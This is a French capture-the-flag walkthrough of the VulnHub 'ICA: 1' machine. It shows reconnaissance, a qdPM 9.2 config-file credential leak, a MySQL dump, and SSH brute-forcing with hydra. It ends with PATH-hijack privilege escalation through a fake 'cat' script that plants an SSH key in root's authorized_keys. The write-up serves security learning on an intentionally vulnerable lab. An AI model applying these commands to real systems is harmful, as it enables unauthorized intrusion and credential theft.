# Solution du CTF ICA: 1 de VulnHub

Présentation
------------

[ICA: 1](https://www.vulnhub.com/entry/ica-1,748/) est un CTF de type boot2root proposé par [Onur Turalı](https://twitter.com/turali_onur) et récupérable depuis VulnHub.  

On dispose d'un petit synopsis pour se mettre dans l'ambiance :  

> According to information from our intelligence network, ICA is working on a secret project. We need to find out what the project is. Once you have the access information, send them to us. We will place a backdoor to access the system later. You just focus on what the project is. You will probably have to go through several layers of security. The Agency has full confidence that you will successfully complete this mission. Good Luck, Agent!

Parmi les ports ouverts on trouve un SSH, un serveur web, un mysql et un autre que Nmap devine comme étant probablement du mysqlx (une spécificité récente de mysql, je n'en sait pas plus) :  

```plain
Nmap scan report for 192.168.2.9
Host is up (0.00021s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   3072 0e:77:d9:cb:f8:05:41:b9:e4:45:71:c1:01:ac:da:93 (RSA)
|   256 40:51:93:4b:f8:37:85:fd:a5:f4:d7:27:41:6c:a0:a5 (ECDSA)
|_  256 09:85:60:c5:35:c1:4d:83:76:93:fb:c7:f0:cd:7b:8e (ED25519)
80/tcp    open  http    Apache httpd 2.4.48 ((Debian))
|_http-title: qdPM | Login
|_http-server-header: Apache/2.4.48 (Debian)
3306/tcp  open  mysql   MySQL 8.0.26
| mysql-info: 
|   Protocol: 10
|   Version: 8.0.26
|   Thread ID: 41
|   Capabilities flags: 65535
|   Some Capabilities: SwitchToSSLAfterHandshake, ODBCClient, LongColumnFlag, LongPassword, Speaks41ProtocolNew, InteractiveClient, IgnoreSigpipes, DontAllowDatabaseTableColumn, SupportsTransactions, Speaks41ProtocolOld, Support41Auth, IgnoreSpaceBeforeParenthesis, ConnectWithDatabase, SupportsLoadDataLocal, FoundRows, SupportsCompression, SupportsMultipleResults, SupportsAuthPlugins, SupportsMultipleStatments
|   Status: Autocommit
|   Salt: NY\x11t\x03*w.h%\x05[\x02W\x7F0WWH%
|_  Auth Plugin Name: caching_sha2_password
| ssl-cert: Subject: commonName=MySQL_Server_8.0.26_Auto_Generated_Server_Certificate
| Not valid before: 2021-09-25T10:47:29
|_Not valid after:  2031-09-23T10:47:29
|_ssl-date: TLS randomness does not represent time
33060/tcp open  mysqlx?
| fingerprint-strings: 
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
|     Invalid message"
|     HY000
|   LDAPBindReq: 
|     *Parse error unserializing protobuf message"
|     HY000
|   oracle-tns: 
|     Invalid message-frame."
|_    HY000
```

J'ai aussi lancé *feroxbuster* qui n'a pas remonté grand chose d'intéressant :  

```plain
$ feroxbuster -u http://192.168.2.9/ -w raft-large-directories.txt -t 10 -n

 ___  ___  __   __     __      __         __   ___ 
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__  
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___ 
by Ben "epi" Risher 🤓                 ver: 2.4.0
───────────────────────────┬────────────────────── 
 🎯  Target Url            │ http://192.168.2.9/    
 🚀  Threads               │ 10
 📖  Wordlist              │ raft-large-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500] 
 💥  Timeout (secs)        │ 7 
 🦡  User-Agent            │ feroxbuster/2.4.0 
 🚫  Do Not Recurse        │ true 
───────────────────────────┴────────────────────── 
 🏁  Press [ENTER] to use the Scan Cancel Menu™ 
────────────────────────────────────────────────── 
301        9l       28w      307c http://192.168.2.9/js 
301        9l       28w      311c http://192.168.2.9/images 
301        9l       28w      308c http://192.168.2.9/css 
301        9l       28w      312c http://192.168.2.9/install 
301        9l       28w      312c http://192.168.2.9/uploads 
301        9l       28w      313c http://192.168.2.9/template 
301        9l       28w      315c http://192.168.2.9/javascript
301        9l       28w      309c http://192.168.2.9/core
301        9l       28w      311c http://192.168.2.9/manual
301        9l       28w      312c http://192.168.2.9/backups
301        9l       28w      307c http://192.168.2.9/sf
301        9l       28w      310c http://192.168.2.9/batch
403        9l       28w      276c http://192.168.2.9/server-status
200      145l      373w     5651c http://192.168.2.9/
```

Avant tout il faut une faille
-----------------------------

A la racine du site on trouve une installation de *qdPM* et un numéro de version : 9.2.  

En ce rendant sur le site de l'éditeur on découvre qu'il s'agit de la dernière version en date. On a aussi un bref descriptif du logiciel :  

> qdPM is a free web-based project management tool suitable for a small team working on multiple projects. It is fully configurable.  
>  You can easy manage Projects, Tasks and People. Customers interact using a Ticket System that is integrated into Task management.

[Sur exploit-db](https://www.exploit-db.com/exploits/50176) on trouve une vulnérabilité pour cette version (non patchée donc). Ça craint un peu, sans compter que la vulnérabilité est toute bête :  

```plain
The password and connection string for the database are stored in a yml file. To access the yml file you can go to http://<website>/core/config/databases.yml file and download.
```

Cette vulnérabilité aurait aussi remontée via le scanner [Nuclei](https://nuclei.projectdiscovery.io/) :  

```plain
$ nuclei -u http://192.168.2.9/

                     __     _ 
   ____  __  _______/ /__  (_)
  / __ \/ / / / ___/ / _ \/ /  
 / / / / /_/ / /__/ /  __/ / 
/_/ /_/\__,_/\___/_/\___/_/   2.4.3

                projectdiscovery.io

[INF] Your current nuclei-templates v8.6.7 are outdated. Latest is v8.6.8 
[INF] Downloading latest release...
[INF] Successfully updated nuclei-templates (v8.6.8). GoodLuck!
[INF] Using Nuclei Engine 2.4.3 (outdated)
[INF] Using Nuclei Templates 8.6.8 (latest)
[INF] Using Interactsh Server https://interact.sh
[INF] Templates loaded: 2502 (New: 52)
[INF] Templates clustered: 381 (Reduced 350 HTTP Requests)
[2021-11-23 13:10:42] [apache-detect] [http] [info] http://192.168.2.9/ [Apache/2.4.48 (Debian)]
[2021-11-23 13:10:43] [tech-detect:font-awesome] [http] [info] http://192.168.2.9/
[2021-11-23 13:10:43] [tech-detect:bootstrap] [http] [info] http://192.168.2.9/ 
[2021-11-23 13:10:44] [http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://192.168.2.9/
[2021-11-23 13:10:44] [http-missing-security-headers:clear-site-data] [http] [info] http://192.168.2.9/
[2021-11-23 13:10:44] [http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://192.168.2.9/ 
[2021-11-23 13:10:44] [http-missing-security-headers:content-security-policy] [http] [info] http://192.168.2.9/ 
[2021-11-23 13:10:44] [http-missing-security-headers:referrer-policy] [http] [info] http://192.168.2.9/ 
[2021-11-23 13:10:44] [http-missing-security-headers:access-control-expose-headers] [http] [info] http://192.168.2.9/
[2021-11-23 13:10:44] [http-missing-security-headers:strict-transport-security] [http] [info] http://192.168.2.9/      
[2021-11-23 13:10:44] [http-missing-security-headers:x-frame-options] [http] [info] http://192.168.2.9/                
[2021-11-23 13:10:44] [http-missing-security-headers:access-control-max-age] [http] [info] http://192.168.2.9/         
[2021-11-23 13:10:44] [http-missing-security-headers:access-control-allow-credentials] [http] [info] http://192.168.2.9/
[2021-11-23 13:10:44] [http-missing-security-headers:access-control-allow-methods] [http] [info] http://192.168.2.9/   
[2021-11-23 13:10:44] [http-missing-security-headers:x-content-type-options] [http] [info] http://192.168.2.9/         
[2021-11-23 13:10:44] [http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://192.168.2.9/     
[2021-11-23 13:10:44] [http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://192.168.2.9/   
[2021-11-23 13:10:44] [http-missing-security-headers:access-control-allow-origin] [http] [info] http://192.168.2.9/    
[2021-11-23 13:10:51] [qdpm-info-leak] [http] [high] http://192.168.2.9/core/config/databases.yml
[2021-11-23 13:10:53] [favicon-detection:qdPM] [http] [info] http://192.168.2.9/favicon.ico
[2021-11-23 13:10:56] [host-header-injection] [http] [info] http://192.168.2.9/
```

Effectivement on trouve bien un YAML avec un password (seule la chaîne entre double quotes est à prendre en compte) :  

```plain
all:
  doctrine:
    class: sfDoctrineDatabase
    param:
      dsn: 'mysql:dbname=qdpm;host=localhost'
      profiler: false
      username: qdpmadmin
      password: "<?php echo urlencode('UcVQCMQk2STVeS6J') ; ?>"
      attributes:
        quote_identifier: true
```

Step in
-------

Je suis bien évidemment tenté d'accéder au mysql mais j'obtiens une erreur :  

```plain
$ mysql -u qdpmadmin -h 192.168.2.9 -p qdpm
Enter password: 
ERROR 1045 (28000): Plugin caching_sha2_password could not be loaded: /usr/lib64/mysql/plugin/caching_sha2_password.so: cannot open shared object file: No such file or directory
```

Ce n'est pas mieux sur le port mysqlx :  

```plain
$ mysql -u qdpmadmin -h 192.168.2.9 -P 33060 -p qdpm
Enter password: 
ERROR:
```

C'est peut être relatif à ma version de MySQL : *mysql Ver 15.1 Distrib 10.6.5-MariaDB, for Linux (x86\_64) using EditLine wrapper*  

Vu que j'ai un mysql plus *"standard"* sur une autre machine je switch dessus et je forward le port :  

```bash
$ ssh -L 4444:192.168.2.9:3306 devloop@192.168.1.47
```

Cette fois ça fonctionne :  

```plain
$ mysql -u qdpmadmin -h 127.0.0.1 -P 4444  -p qdpm
Enter password:
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A 

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 96
Server version: 8.0.26 MySQL Community Server - GPL

Copyright (c) 2000, 2021, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its 
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement. 

mysql> show databases;
+--------------------+ 
| Database           |
+--------------------+
| information_schema |
| mysql              | 
| performance_schema |
| qdpm               | 
| staff              |
| sys                |
+--------------------+
6 rows in set (0,01 sec)
```

Je ne vais pas me taper l'inspection de toutes les dbs et tables manuellement alors je dumpe les dbs qui m'intéressent en SQL :  

```bash
$ mysqldump -u qdpmadmin -h 127.0.0.1 -P 4444 -p qdpm > /tmp/qdpm.sql
```

Il n'y a plus qu'à chercher les occurrences de *INSERT* dans le dump. Celle-ci est intéressante :  

```plain
INSERT INTO `configuration` VALUES (1,'app_administrator_email','admin@localhost.com'),(2,'app_administrator_password','$P$EmesnWRcY9GrK0hDzwaV3rvQnMJ/Fx0'),
```

A priori le hash est au format phpass et on peut tenter de le casser de cette manière :  

```plain
$ john --format=phpass --wordlist=rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (phpass [phpass ($P$ or $H$) 128/128 AVX 4x3])
Cost 1 (iteration count) is 65536 for all loaded hashes 
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
```

Toutefois ça ne semble mener nul part. Je passe à la base *staff* :  

```plain
INSERT INTO `login` VALUES (1,2,'c3VSSkFkR3dMcDhkeTNyRg=='),(2,4,'N1p3VjRxdGc0MmNtVVhHWA=='),(3,1,'WDdNUWtQM1cyOWZld0hkQw=='),(4,3,'REpjZVZ5OThXMjhZN3dMZw=='),(5,5,'Y3FObkJXQ0J5UzJEdUpTeQ==');
INSERT INTO `user` VALUES (1,1,'Smith','Cyber Security Specialist'),(2,2,'Lucas','Computer Engineer'),(3,1,'Travis','Intelligence Specialist'),(4,1,'Dexter','Cyber Security Analyst'),(5,2,'Meyer','Genetic Engineer');
```

Je décode les base64, rassemble les noms d'utilisateurs (avec et sans majuscules) dans un fichier, les pass dans un autre et je bruteforce SSH avec ces informations :  

```plain
$ hydra -L /tmp/users.txt -P /tmp/passwords.txt  ssh://192.168.2.9
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-11-23 12:52:03
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4  
[DATA] max 16 tasks per 1 server, overall 16 tasks, 32 login tries (l:8/p:4), ~2 tries per task 
[DATA] attacking ssh://192.168.2.9:22/ 
[22][ssh] host: 192.168.2.9   login: travis   password: DJceVy98W28Y7wLg
[22][ssh] host: 192.168.2.9   login: dexter   password: 7ZwV4qtg42cmUXGX
1 of 1 target successfully completed, 2 valid passwords found 
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-11-23 12:52:13
```

Step up
-------

On trouve un flag dans le dossier de l'utilisateur Travis :  

```plain
travis@debian:~$ cat user.txt
ICA{Secret_Project}
```

Mais rien de plus, alors je passe sur l'utilisateur Dexter :  

```plain
dexter@debian:~$ cat note.txt 
It seems to me that there is a weakness while accessing the system.
As far as I know, the contents of executable files are partially viewable.
I need to find out if there is a vulnerability or not
```

Je trouve effectivement un binaire setuid dans un dossier inhabituel :  

```plain
dexter@debian:~$ find / -type f -perm -u+s 2> /dev/null
/opt/get_access
/usr/bin/chfn
/usr/bin/umount
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/su
/usr/bin/mount
/usr/bin/chsh
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

*get\_access* et lisible et setuid root :  

```plain
-rwsr-xr-x 1 root root 16816 Sep 25 09:25 /opt/get_access
```

L'extraction des chaînes de caractère donne une idée de ce que fait le programme :  

```plain
dexter@debian:~$ strings /opt/get_access
/lib64/ld-linux-x86-64.so.2
setuid 
socket
puts
system
__cxa_finalize
setgid
__libc_start_main
libc.so.6
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
u/UH 
[]A\A]A^A_
cat /root/system.info
Could not create socket to access to the system. 
All services are disabled. Accessing to the system is allowed only within working hours. 
;*3$" 
GCC: (Debian 10.2.1-6) 10.2.1 20210110 
crtstuff.c 
deregister_tm_clones
--- snip ---
```

```plain
dexter@debian:~$ ls -l /root/system.info
ls: cannot access '/root/system.info': Permission denied 
dexter@debian:~$ /opt/get_access

  ############################ 
  ########     ICA     #######
  ### ACCESS TO THE SYSTEM ###
  ############################ 

  Server Information: 
   - Firewall:  AIwall v9.5.2
   - OS:        Debian 11 "bullseye"
   - Network:   Local Secure Network 2 (LSN2) v 2.4.1

All services are disabled. Accessing to the system is allowed only within working hours.
```

Il s'agit d'une exploitation classique du PATH puisque le binaire exécute *cat* sans spécifier son chemin au complet :  

```bash
dexter@debian:~$ cat cat
#!/usr/bin/bash
mkdir -p /root/.ssh
echo "ssh-rsa --ma-cle-publique-ssh--" >> /root/.ssh/authorized_keys
dexter@debian:~$ chmod +x cat
dexter@debian:~$ export PATH=.:$PATH
dexter@debian:~$ /opt/get_access
All services are disabled. Accessing to the system is allowed only within working hours.
```

Plus qu'à récupérer notre accès :  

```plain
$ ssh root@192.168.2.9
Enter passphrase for key '/home/sirius/.ssh/id_rsa':
root@debian:~# id
uid=0(root) gid=0(root) groups=0(root)
root@debian:~# cat root.txt
ICA{Next_Generation_Self_Renewable_Genetics}
```


*Published November 23 2021 at 13:18*